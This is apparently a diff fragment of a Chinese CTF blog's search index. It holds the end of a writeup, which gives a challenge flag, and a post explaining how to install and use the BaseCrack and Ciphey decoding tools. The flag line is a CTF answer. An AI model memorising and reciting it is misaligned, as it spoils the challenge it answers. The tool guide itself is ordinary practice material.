+<p><span style="font-size: 12pt">FLAG值：cazy{L1near_Equ4t1on6_1s_34sy}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+]]></content>
+      <categories>
+        <category>刷题笔记</category>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>刷题</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>两款包含但不限于base系列的解密工具</title>
+    <url>/2021/12/03/20211203/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!--前言&gt;-->
+
+<h1 id="两款包含但不限于base系列的解密工具"><a href="#两款包含但不限于base系列的解密工具" class="headerlink" title="两款包含但不限于base系列的解密工具"></a>两款包含但不限于base系列的解密工具</h1><p>前言&gt; 在之前一次ctf比赛中的一个base62，因为自己工具太少，网上资源找大半天，最后解出来的还不是flag。 所以这次吸取教训，收集了两款包含但不限于base解码的工具。因为网上使用教程太过普及或太少了，所以这里附上安装方法和使用说明。   1.basecrack 工具简介： BaseCrack能够支持目前社区使用最为频繁的Base编码机制，其中包括Base16、Base32、Base36、Base58、Base62、Base64、Base64Url、Base85、Base91、Base92等等。除此之外，该工具也可以为CTF比赛，漏洞奖励计划和数据加密解密提供有效帮助。 注意：当前版本的BaseCrack可同时支持Python2和Python3环境。 </p>
+<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul>
+<li>能够对任意模式的多重Base编码数据进行解码；</li>
+<li>能够对来自文件的多个Base编码数据进行解码；</li>
+<li>能够利用解码后的Base数据生成字典文件并输出；</li>
+<li>能够对目标Base数据的编码方案类型进行预测；<br>安装方法： 可以使用下列命令将该项目源码克隆至本地： $ git clone <a href="https://github.com/mufeedvh/basecrack.git">https://github.com/mufeedvh/basecrack.git</a> $ cd basecrack $ pip install –default-time&#x3D;100 -r requirements.txt 这里安装有个坑就是要用–default-time&#x3D;100设置超时时间，否则pip超时过久就会报错，也算是个小经验吧，在很多安装中用–default-time&#x3D;100有奇效。   然后安装完可能会报错说你还缺少一个模块   <img src="http://www.anyiblog.top/uploads/2021/12/6fa4dfd5c8e8e20d0d763b564497e489.png">   进行安装termcolor会有以下报错： <img src="http://www.anyiblog.top/uploads/2021/12/238dc579606367d19899823da7b316fb.png">   用这条即可解决 (这里target要根据报错的路径来) sudo pip install -target&#x3D;path termcolor   <img src="http://www.anyiblog.top/uploads/2021/12/3bda6fc7369361caab0502ebd997884a.png">   最后python basecrack.py即可运行   <img src="http://www.anyiblog.top/uploads/2021/12/b9a613ec4864290044958370788e425a.png"> 使用方法： 对来自用户输入的单个Base编码数据进行解码： python basecrack.py 对通过参数（-b&#x2F;–base）传递的单个Base编码数据进行解码： python basecrack.py -b SGVsbG8gV29ybGQh 对通过文件（-f&#x2F;–file）传递的多个Base编码数据进行解码： python basecrack.py -f file.txt 对任意模式的多重Base编码数据进行解码（-m&#x2F;–magic）： python basecrack.py –magic 使用解码的Base数据生成字典文件并输出（-o&#x2F;–output）： python basecrack.py -f file.txt -o output-wordlist.txt   2.ciphey 工具简介： Ciphey 是一个使用自然语言处理和人工智能的全自动解密&#x2F;解码&#x2F;破解工具。 简单地来讲，你只需要输入加密文本，它就能给你返回解密文本。 支持的解密：</li>
+</ul>
+<ol>
+<li>维吉尼亚密码</li>
+<li>凯撒加密</li>
+<li>反向密码（把明文反过来作为加密）</li>
+<li>换位密码（不过我自己试了试感觉好像不好解出来）</li>
+<li>替换密码<br>Ciphey 支持破解 6 种基础加密： <img src="http://www.anyiblog.top/uploads/2021/12/0c786c9b094b86af7eb77f7fb883073e.png"> 16 种编码： <img src="http://www.anyiblog.top/uploads/2021/12/b8ca07270cca6244371d8e914f6a8d20.png"> 哈希也支持，不过效果不可控。   安装方法：    注意!注意！！注意！！！ 不能是 python3.9版本   <strong>不能是 python 32位版本</strong> 建议使用 python 3.8 64位版本：python-3.8.10-amd64.exe    请选择以下任一种方式输入命令安装依赖： 1. Windows 环境 打开 Cmd (开始-运行-CMD)。 2. MacOS 环境 打开 Terminal (command+空格输入Terminal)。 3. 如果你用的是 VSCode编辑器 或 Pycharm，可以直接使用界面下方的Terminal. pip install -U ciphey&amp;pip install ciphey -i <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a> windows下安装完运行可能会报错 UnicodeDecodeError: ‘gbk’ codec can’t decode byte 0xbf 然后就是要修改 ..\envs\对应的环境名\Lib\site-packages\pywhat\regex_identifier.py 根据错误修改代码，主要是在读取文件的时候发生错误，将”r” 改为”rb”,即可。   <img src="http://www.anyiblog.top/uploads/2021/12/726b6a36f48b0f04b9ae2102517f8e1b.webp"> 使用方法：   主要以下两种用法：   (在编辑器下使用效果最佳，命令行下颜色代码显示不出来影响观感) 命令行下输入： ciphey -t “密文” ciphey -f 文件名 例如： ciphey -t ‘aGVsbG8gbXkgbmFtZSBpcyBiZWU&#x3D;’ cipyhey -f flag.txt <img src="http://www.anyiblog.top/uploads/2021/12/9c7b750415a8b62ac979b566f5e00a84.png">   <img src="http://www.anyiblog.top/uploads/2021/12/3fa55bbd28c2a7cce574fb1947068626.png"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>干货</category>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>干货</tag>
       </tags>
   </entry>
 </search>
